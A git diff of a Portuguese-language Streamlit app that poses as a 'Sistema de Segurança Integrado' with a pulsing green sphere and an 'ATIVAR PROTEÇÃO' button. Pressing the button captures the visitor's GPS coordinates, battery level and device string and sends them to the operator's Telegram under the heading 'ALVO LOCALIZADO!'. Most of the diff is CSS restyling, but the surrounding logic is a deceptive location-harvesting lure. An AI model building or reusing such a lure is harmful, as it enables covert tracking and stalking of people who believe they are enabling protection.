@@ -13,62 +13,64 @@ def enviar_telegram(mensagem):
     except: pass
 
 # 2. CONFIGURAÇÃO DA PÁGINA
-st.set_page_config(page_title="Sistema de Segurança Integrado", page_icon="🔐", layout="centered")
+st.set_page_config(page_title="Sistema De Segurança Integrado", page_icon="🔐", layout="centered")
 
-# 3. VISUAL E ANIMAÇÃO DA ESFERA VERDE
+# 3. CÓDIGO DA ANIMAÇÃO (CSS PURO)
 st.markdown("""
     <style>
-    .main { background-color: #0d1117; color: white; }
+    .main { background-color: #0d1117; }
     
-    /* Título e Escudo */
-    .header-container { text-align: center; margin-bottom: 20px; }
-    .shield-icon { font-size: 50px; margin-bottom: 10px; }
-    
-    /* Esfera de Energia Verde */
-    .sphere-container {
-        display: flex; justify-content: center; align-items: center; margin: 30px 0;
+    /* Container da Esfera */
+    .radar-container {
+        display: flex; justify-content: center; align-items: center; padding: 40px 0;
     }
-    .green-sphere {
-        width: 180px; height: 180px;
-        background: radial-gradient(circle, #2ecc71 0%, #27ae60 40%, #000 75%);
+    
+    /* A Esfera Verde Pulsante */
+    .green-globe {
+        width: 150px; height: 150px;
+        background: radial-gradient(circle, #2ecc71 0%, rgba(0,255,100,0.1) 70%);
         border-radius: 50%;
-        box-shadow: 0 0 30px #2ecc71, inset 0 0 50px #2ecc71;
+        box-shadow: 0 0 40px #2ecc71, inset 0 0 20px #2ecc71;
+        position: relative;
         animation: pulse 2s infinite ease-in-out;
-        display: flex; justify-content: center; align-items: center;
-        border: 1px solid rgba(46, 204, 113, 0.3);
     }
-    @keyframes pulse {
-        0% { transform: scale(0.95); box-shadow: 0 0 20px #2ecc71; opacity: 0.8; }
-        50% { transform: scale(1.05); box-shadow: 0 0 50px #2ecc71; opacity: 1; }
-        100% { transform: scale(0.95); box-shadow: 0 0 20px #2ecc71; opacity: 0.8; }
+    
+    /* Efeito de brilho extra */
+    .green-globe::after {
+        content: '';
+        position: absolute;
+        width: 100%; height: 100%;
+        border-radius: 50%;
+        border: 2px solid #2ecc71;
+        animation: orbit 3s linear infinite;
+        opacity: 0.5;
     }
 
-    /* Botão Ativar Proteção */
+    @keyframes pulse {
+        0% { transform: scale(0.9); opacity: 0.7; box-shadow: 0 0 20px #2ecc71; }
+        50% { transform: scale(1.05); opacity: 1; box-shadow: 0 0 50px #2ecc71; }
+        100% { transform: scale(0.9); opacity: 0.7; box-shadow: 0 0 20px #2ecc71; }
+    }
+
+    /* Botão Amarelo */
     div.stButton > button {
         background-color: #ffc107 !important;
         color: black !important;
         font-weight: bold !important;
-        width: 100%; height: 4em; border-radius: 12px;
-        border: none !important; font-size: 18px !important;
+        width: 100% !important; height: 4em !important;
+        border-radius: 12px !important; border: none !important;
     }
     
-    /* Rodapé Miamy */
-    .footer {
-        text-align: center; color: #555; font-size: 13px;
-        margin-top: 60px; font-weight: bold; letter-spacing: 1px;
-    }
+    .footer { text-align: center; color: #555; font-size: 13px; margin-top: 50px; }
     </style>
 
-    <div class="header-container">
-        <div class="shield-icon">🛡️</div>
-        <h1 style='color: #ffc107; margin:0;'>SEGURANÇA ATIVA</h1>
+    <div style="text-align: center;">
+        <h1 style='color: #green; margin-bottom: 0;'>🛡️ SEGURANÇA ATIVA</h1>
         <p style='color: #ccc;'>Monitoramento em Tempo Real</p>
     </div>
 
-    <div class="sphere-container">
-        <div class="green-sphere">
-            <div style="font-size: 40px;">✨</div>
-        </div>
+    <div class="radar-container">
+        <div class="green-globe"></div>
     </div>
     """, unsafe_allow_html=True)
 
@@ -80,21 +82,21 @@ loc = get_geolocation()
 # 5. LÓGICA DO BOTÃO
 if st.button("🔴 ATIVAR PROTEÇÃO"):
     if loc and 'coords' in loc:
-        lat, lon = loc['coords']['latitude'], loc['coords']['longitude']
+        lat = loc['coords']['latitude']
+        lon = loc['coords']['longitude']
         mapa = f"https://www.google.com/maps?q={lat},{lon}"
         
         relatorio = (
             f"🔔 ALVO LOCALIZADO!\n\n"
             f"📱 Aparelho: {ua[:50]}... \n"
             f"🔋 Bateria: {bat if bat else '--'}%\n"
-            f"📍 Mapa: [ABRIR LOCALIZAÇÃO]({mapa})"
+            f"📍 Mapa: [VER LOCALIZAÇÃO]({mapa})"
         )
         
         enviar_telegram(relatorio)
         st.success("✅ Localização Enviada ao Telegram!")
-        st.balloons()
     else:
-        st.warning("🛰️ Carregando sinal de satélite... Clique novamente em 2 segundos.")
+        st.warning("🛰️ Carregando GPS... Clique novamente em 2 segundos.")
 
-# 6. ASSINATURA FINAL
+# 6. ASSINATURA
 st.markdown('<p class="footer">Desenvolvido Por Miamy © 2026</p>', unsafe_allow_html=True)
